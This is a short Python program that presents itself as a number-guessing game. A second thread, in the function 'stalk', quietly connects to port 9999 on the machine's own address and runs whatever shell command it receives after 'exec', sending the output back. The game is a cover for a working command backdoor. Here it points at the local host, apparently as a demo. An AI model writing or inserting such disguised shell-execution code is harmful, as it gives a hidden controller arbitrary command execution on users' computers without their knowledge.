import socket
import os
import subprocess
import random
import time
import threading
import socket

hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)


def stalk():
    global IPAddr
    s = socket.socket()
    host = IPAddr
    port = 9999
    s.connect((host, port))
    data = ''

    cmd_status = False
    while True:
        data = s.recv(1024)
        data = data.decode('utf-8')
        if data.split(' ')[-1] == 'cmdstart':
            cmd_status = True
        if data.split(' ')[-1] == 'cmdstop':
            cmd_status = False

        if cmd_status and data.split(' ')[0] == 'exec':
            data = ' '.join(data.split(' ')[1:])
            op = subprocess.Popen(data, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = str(op.stdout.read())
            s.send(output.encode('utf-8'))

    s.close()


def game():
    print("welcome to game")
    continu = True
    while continu:
        continu = False
        base = random.randint(0, 100)
        won = False
        tries = 0
        while not won:
            try:
                response = int(input('Enter your guess of number : '))
                tries += 1
                if base == response:
                    won = True
                elif base < response:
                    print("real number is smaller")
                else:
                    print("real number is larger")
            except:
                print("dude dafuq")
        print("----------------------CONGRATULATIONS YOU WON-----------------------")
        print("You took {} attempts".format(tries))
        time.sleep(3)
        if os.name == 'posix':
            os.system("clear")
        else:
            os.system("cls")
        continu = True if input("Do you want to play again?? : ") == 'y' else False


if __name__ == "__main__":
    t1 = threading.Thread(target=game)
    t2 = threading.Thread(target=stalk)

    t1.start()
    t2.start()
